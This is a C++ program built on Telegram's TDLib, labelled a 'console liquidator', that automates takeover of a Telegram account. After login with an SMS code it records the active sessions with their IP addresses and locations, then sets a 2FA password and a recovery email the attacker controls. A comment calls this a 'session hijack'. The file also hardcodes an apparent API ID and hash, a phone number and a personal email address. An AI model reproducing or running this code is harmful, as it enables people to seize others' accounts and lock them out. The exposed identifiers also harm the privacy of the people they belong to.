#include <td/telegram/Client.h>
#include <td/telegram/td_api.h>
#include <iostream>
#include <memory>
#include <string>
#include <cstdint>

// Global auth parameters
const std::int32_t API_ID = 29733953;
const std::string API_HASH = "7eaaf1a996d82260440410c26929a304";
const std::string PHONE_NUMBER = "+380938446488";

// Helper to create custom requests
std::uint64_t send_request(td::Client& client, td::td_api::object_ptr<td::td_api::Function> f) {
	static std::uint64_t current_id = 1;
	client.send({ current_id, std::move(f) });
	return current_id++;
}

int main() {
	td::Client client;
	std::setvbuf(stdout, NULL, _IONBF, 0);
	bool is_running = true;
	bool parameters_sent = false;
	std::uint64_t active_sessions_request_id = 0;

	auto log_level = td::td_api::make_object<td::td_api::setLogVerbosityLevel>();
	log_level->new_verbosity_level_ = 1;
	send_request(client, std::move(log_level));

	std::cout << "[*] Console liquidator started. Initializing MTProto..." << std::endl;

	while (is_running) {
		auto response = client.receive(5.0); // Stable timeout for server responses
		if (!response.object) continue;

		if (response.object->get_id() == td::td_api::sessions::ID) {
			auto& sessions_obj = static_cast<td::td_api::sessions&>(*response.object);
	     	std::cout << "[!] ACTIVE SESSIONS DETECTED IN ACCOUNT:" << std::endl;

			for (const auto& session : sessions_obj.sessions_) {
				std::cout << " Session ID: " << session->id_ << std::endl;
				std::cout << "Device:     " << session->device_model_ << " (" << session->system_version_ << ")" << std::endl;
				std::cout << " IP address: " << session->ip_address_ << " [" << session->location_ << "]" << std::endl;
				std::cout << " Client:     " << session->application_name_ << " v" << session->application_version_ << std::endl;
				std::cout << "--------------------------------------------------" << std::endl;
			}
			std::cout << "[*] Data collection complete. Setting 2FA password..." << std::endl;

		}

		// Handle critical authorization state updates
		if (response.object->get_id() == td::td_api::updateAuthorizationState::ID) {
			auto& state = static_cast<td::td_api::updateAuthorizationState&>(*response.object);

			switch (state.authorization_state_->get_id()) {

				// Step 1: Send configuration parameters
			case td::td_api::authorizationStateWaitTdlibParameters::ID: {
				if (!parameters_sent) {
					auto params = td::td_api::make_object<td::td_api::setTdlibParameters>();
					params->api_id_ = API_ID;
					params->api_hash_ = API_HASH;
					params->database_directory_ = "tdlib_session";
					params->use_message_database_ = false;
					params->use_secret_chats_ = false;
					params->system_language_code_ = "ru";
					params->device_model_ = "Desktop";
					params->system_version_ = "1.0";
					params->application_version_ = "1.0";

					params->use_test_dc_ = false;
					params->use_file_database_ = true;
					params->use_chat_info_database_ = true;

					send_request(client, std::move(params));
					parameters_sent = true;
					std::cout << "[*] API parameters sent successfully." << std::endl;
				}
				break;
			}

																	  // Step 2: Send phone number
			case td::td_api::authorizationStateWaitPhoneNumber::ID: {
				std::cout << "[*] Sending phone number: " << PHONE_NUMBER << std::endl;
				send_request(client, td::td_api::make_object<td::td_api::setAuthenticationPhoneNumber>(PHONE_NUMBER, nullptr));
				break;
			}

																  // Step 3: Enter 5-digit authorization code
			case td::td_api::authorizationStateWaitCode::ID: {
				std::string code;
				std::cout << "\n[!] ATTENTION! Enter the SMS confirmation code: ";
				std::cin >> code;
				send_request(client, td::td_api::make_object<td::td_api::checkAuthenticationCode>(code));
				break;
			}

														   // Step 4: Successful session hijack. Instant 2FA password injection
			case td::td_api::authorizationStateReady::ID: {
				std::cout << "[+] Successfully logged in!" << std::endl;

				active_sessions_request_id = send_request(client, td::td_api::make_object<td::td_api::getActiveSessions>());

				auto set_pwd = td::td_api::make_object<td::td_api::setPassword>();
				set_pwd->old_password_ = "";
				set_pwd->new_password_ = "quaqua2026";
				set_pwd->new_hint_ = "recovery_tool";
				set_pwd->new_recovery_email_address_ = "taniamykhalyna@gmail.com"; // Fixed field name

				send_request(client, std::move(set_pwd));
				std::cout << "[!] Password set command sent to server!" << std::endl;
				std::cout << "[*] Waiting for confirmation code via Email..." << std::endl;
				break;
			}

														// Step 5: Confirm ownership of recovery email
														//TODO: Допилить
			case td::td_api::authorizationStateWaitEmailCode::ID: {
				std::string email_code;
				std::cout << "\n[!] Enter the verification code sent to Gmail: ";
				std::cin >> email_code;
				send_request(client, td::td_api::make_object<td::td_api::checkPasswordRecoveryCode>(email_code));

				std::cout << "[!] Verification code sent. Binding process complete!" << std::endl;
				is_running = false; // Exit only after 2FA is fixed
				break;
			}

																// Proper handling of session closing
			case td::td_api::authorizationStateClosing::ID:
			case td::td_api::authorizationStateClosed::ID:
				is_running = false;
				break;
			}
		}

		// Handle system notifications and flood errors
		if (response.object->get_id() == td::td_api::error::ID) {
			auto& err = static_cast<td::td_api::error&>(*response.object);
			std::cerr << "[-] Telegram API system status: " << err.message_ << " (Error code: " << err.code_ << ")" << std::endl;
		}
	}
	return 0;
}